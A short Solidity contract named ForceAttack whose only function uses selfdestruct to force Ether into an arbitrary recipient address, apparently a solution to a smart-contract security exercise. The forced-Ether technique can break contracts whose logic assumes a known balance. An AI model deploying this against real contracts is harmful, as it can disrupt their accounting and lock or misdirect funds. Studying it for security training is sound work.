// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract ForceAttack {
    function forceSend(address recipient) public payable {
        selfdestruct(payable(recipient));
    }
}
